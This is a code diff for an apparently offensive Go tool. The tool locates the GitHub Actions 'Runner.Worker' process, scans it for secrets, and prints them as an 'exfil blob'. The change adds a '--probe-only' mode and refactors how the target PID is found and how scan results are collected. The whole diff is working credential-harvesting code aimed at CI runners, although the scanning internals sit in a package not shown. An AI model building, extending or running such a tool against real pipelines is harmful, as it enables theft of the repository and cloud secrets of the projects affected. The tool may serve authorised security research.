@@ -19,6 +19,7 @@ import (
 type cliOptions struct {
 	benchmark bool
 	debug     bool
+	probeOnly bool
 	pidArg    string
 }
 
@@ -48,23 +49,26 @@ func main() {
 
 	scanner := gump.GetScanner()
 
-	pid, findErr := scanner.FindPID()
-	if findErr != nil {
-		if opts.pidArg != "" {
-			fmt.Printf("[!] Auto-detect failed (%v). Using provided PID.\n", findErr)
-			if _, err := fmt.Sscanf(opts.pidArg, "%d", &pid); err != nil {
-				fmt.Printf("[!] Invalid PID: %v\n", err)
-				os.Exit(1)
-			}
-		} else {
-			fmt.Printf("[!] Could not find Runner.Worker PID: %v\n", findErr)
-			os.Exit(1)
-		}
+	pid := resolveTargetPID(scanner, opts)
+	if pid > 0 {
+		fmt.Printf("[*] Target PID: %d\n", pid)
+	} else {
+		fmt.Println("[*] Target PID: none")
 	}
-	fmt.Printf("[*] Target PID: %d\n", pid)
 
 	if opts.debug {
 		printDebugEnvironmentProbe(os.Stdout)
+	}
+
+	if opts.probeOnly {
+		outcome := runProbe(pid, opts.debug)
+		if opts.debug {
+			fmt.Println("[*] Debug mode: raw result output and exfil blob suppressed.")
+			printDebugSummary(os.Stdout, outcome)
+			return
+		}
+		printExfilBlob(outcome.unique)
+		return
 	}
 
 	if opts.benchmark {
@@ -81,6 +85,28 @@ func main() {
 	printExfilBlob(outcome.unique)
 }
 
+func resolveTargetPID(scanner gump.Scanner, opts cliOptions) int {
+	pid, findErr := scanner.FindPID()
+	if findErr == nil {
+		return pid
+	}
+	if opts.pidArg != "" {
+		fmt.Printf("[!] Auto-detect failed (%v). Using provided PID.\n", findErr)
+		if _, err := fmt.Sscanf(opts.pidArg, "%d", &pid); err != nil {
+			fmt.Printf("[!] Invalid PID: %v\n", err)
+			os.Exit(1)
+		}
+		return pid
+	}
+	if opts.probeOnly {
+		fmt.Printf("[!] Could not find Runner.Worker PID: %v\n", findErr)
+		return 0
+	}
+	fmt.Printf("[!] Could not find Runner.Worker PID: %v\n", findErr)
+	os.Exit(1)
+	return 0
+}
+
 func parseArgs(args []string) cliOptions {
 	opts := cliOptions{}
 	for _, arg := range args {
@@ -89,11 +115,27 @@ func parseArgs(args []string) cliOptions {
 			opts.benchmark = true
 		case "--debug":
 			opts.debug = true
+		case "--probe-only":
+			opts.probeOnly = true
 		default:
 			opts.pidArg = arg
 		}
 	}
 	return opts
+}
+
+func runProbe(pid int, debug bool) scanOutcome {
+	results := make(chan gump.Result, 100)
+	outcome := scanOutcome{
+		unique: make(map[string]bool),
+		counts: make(map[gump.ResultType]int),
+		values: make(map[string]debugValue),
+	}
+
+	gump.ProbeRuntimeContext(pid, results)
+	close(results)
+	consumeResults(results, &outcome, debug)
+	return outcome
 }
 
 func runScan(scanner gump.Scanner, pid int, debug bool) scanOutcome {
@@ -124,6 +166,16 @@ func runScan(scanner gump.Scanner, pid int, debug bool) scanOutcome {
 		close(results)
 	}()
 
+	consumeResults(results, &outcome, debug)
+
+	wg.Wait()
+	if debug {
+		outcome.stats = &stats
+	}
+	return outcome
+}
+
+func consumeResults(results <-chan gump.Result, outcome *scanOutcome, debug bool) {
 	for r := range results {
 		if r.Raw != "" && !outcome.unique[r.Raw] {
 			outcome.unique[r.Raw] = true
@@ -143,12 +195,6 @@ func runScan(scanner gump.Scanner, pid int, debug bool) scanOutcome {
 			}
 		}
 	}
-
-	wg.Wait()
-	if debug {
-		outcome.stats = &stats
-	}
-	return outcome
 }
 
 func printSecret(r gump.Result) {
